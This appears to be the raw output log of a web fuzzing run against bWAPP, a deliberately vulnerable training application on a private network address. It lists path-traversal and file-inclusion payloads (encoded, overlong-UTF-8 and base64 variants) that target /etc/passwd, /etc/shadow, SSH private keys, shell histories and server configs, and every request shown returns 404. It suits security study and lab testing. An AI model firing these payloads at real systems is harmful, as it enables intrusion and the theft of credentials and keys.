104,404,9L,39W,http://192.168.1.86/bWAPP/../config.asp
105,404,9L,39W,http://192.168.1.86/bWAPP/_config.php
106,404,9L,39W,http://192.168.1.86/bWAPP/../_config.php
107,404,9L,39W,http://192.168.1.86/bWAPP/../_config.php%00
108,404,9L,39W,http://192.168.1.86/bWAPP/../config.php
110,404,9L,39W,http://192.168.1.86/bWAPP/../config.inc.php
111,404,9L,39W,http://192.168.1.86/bWAPP//config.asp
112,404,9L,39W,http://192.168.1.86/bWAPP/../config.asp
114,404,9L,39W,http://192.168.1.86/bWAPP//admin/install.php
115,404,9L,39W,http://192.168.1.86/bWAPP/../install.php
118,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
119,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
120,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
121,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
122,404,9L,39W,http://192.168.1.86/bWAPP/..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
123,404,9L,39W,http://192.168.1.86/bWAPP/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
124,404,9L,39W,http://192.168.1.86/bWAPP//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
126,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
127,404,9L,39W,http://192.168.1.86/bWAPP/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdw==
130,404,9L,39W,http://192.168.1.86/bWAPP//..\..\..\..\..\..\winnt\win.ini
132,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//boot.ini
133,404,9L,39W,http://192.168.1.86/bWAPP/..\../..\../boot.ini
134,404,9L,39W,http://192.168.1.86/bWAPP/..\../..\../..\../..\../boot.ini
135,404,9L,39W,http://192.168.1.86/bWAPP/\.....\\\.....\\\.....\\\
136,404,9L,42W,"http://192.168.1.86/bWAPP/=3D%20""/..""%20.%20""%2f.."
137,404,9L,39W,http://192.168.1.86/bWAPP/d:\AppServ\MySQL
138,404,9L,39W,http://192.168.1.86/bWAPP/c:\AppServ\MySQL
139,404,9L,39W,http://192.168.1.86/bWAPP/c:WINDOWS/system32/
140,404,9L,40W,http://192.168.1.86/bWAPP//C:\Program%20Files\
141,404,9L,40W,http://192.168.1.86/bWAPP//D:\Program%20Files\
142,404,9L,39W,http://192.168.1.86/bWAPP//C:/inetpub/ftproot/
144,404,9L,39W,http://192.168.1.86/bWAPP//boot/grub/grub.conf
145,404,9L,39W,http://192.168.1.86/bWAPP//proc/interrupts
146,404,9L,39W,http://192.168.1.86/bWAPP//proc/cpuinfo
147,404,9L,39W,http://192.168.1.86/bWAPP//proc/meminfo
149,404,9L,39W,http://192.168.1.86/bWAPP/../apache/logs/error.log
150,404,9L,39W,http://192.168.1.86/bWAPP/../apache/logs/access.log
199,404,9L,39W,http://192.168.1.86/bWAPP/~/.atfp_history
200,404,9L,39W,http://192.168.1.86/bWAPP/~/.bash_history
201,404,9L,39W,http://192.168.1.86/bWAPP/~/.bash_logout
202,404,9L,39W,http://192.168.1.86/bWAPP/~/.bash_profile
203,404,9L,39W,http://192.168.1.86/bWAPP/~/.bashrc
204,404,9L,39W,http://192.168.1.86/bWAPP/~/.gtkrc
205,404,9L,39W,http://192.168.1.86/bWAPP/~/.login
206,404,9L,39W,http://192.168.1.86/bWAPP/~/.logout
207,404,9L,39W,http://192.168.1.86/bWAPP/~/.mysql_history
208,404,9L,39W,http://192.168.1.86/bWAPP/~/.nano_history
209,404,9L,39W,http://192.168.1.86/bWAPP/~/.php_history
210,404,9L,39W,http://192.168.1.86/bWAPP/~/.profile
211,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/authorized_keys
212,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/id_dsa
213,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/id_dsa.pub
214,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/id_rsa
215,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/id_rsa.pub
216,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/identity
217,404,9L,39W,http://192.168.1.86/bWAPP/~/.ssh/identity.pub
218,404,9L,39W,http://192.168.1.86/bWAPP/~/.viminfo
219,404,9L,39W,http://192.168.1.86/bWAPP/~/.wm_style
220,404,9L,39W,http://192.168.1.86/bWAPP/~/.Xdefaults
221,404,9L,39W,http://192.168.1.86/bWAPP/~/.xinitrc
222,404,9L,39W,http://192.168.1.86/bWAPP/~/.Xresources
223,404,9L,39W,http://192.168.1.86/bWAPP/~/.xsession
226,404,9L,39W,http://192.168.1.86/bWAPP//etc/init.d/apache
227,404,9L,39W,http://192.168.1.86/bWAPP//etc/init.d/apache2
228,404,9L,39W,http://192.168.1.86/bWAPP//etc/httpd/httpd.conf
229,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache/apache.conf
230,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache/httpd.conf
231,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/apache2.conf
232,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/httpd.conf
233,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/apache2/conf/httpd.conf
234,404,9L,39W,http://192.168.1.86/bWAPP//usr/local/apache/conf/httpd.conf
235,404,9L,39W,http://192.168.1.86/bWAPP//opt/apache/conf/httpd.conf
236,404,9L,39W,http://192.168.1.86/bWAPP//home/apache/httpd.conf
237,404,9L,39W,http://192.168.1.86/bWAPP//home/apache/conf/httpd.conf
238,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/sites-available/default
239,404,9L,39W,http://192.168.1.86/bWAPP//etc/apache2/vhosts.d/default_vhost.include
241,404,9L,39W,http://192.168.1.86/bWAPP//etc/at.allow
242,404,9L,39W,http://192.168.1.86/bWAPP//etc/at.deny
244,404,9L,39W,http://192.168.1.86/bWAPP//etc/passwd
245,404,9L,39W,http://192.168.1.86/bWAPP//etc/shadow
246,404,9L,39W,http://192.168.1.86/bWAPP//etc/group
247,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/group
248,404,9L,39W,http://192.168.1.86/bWAPP//etc/security/passwd
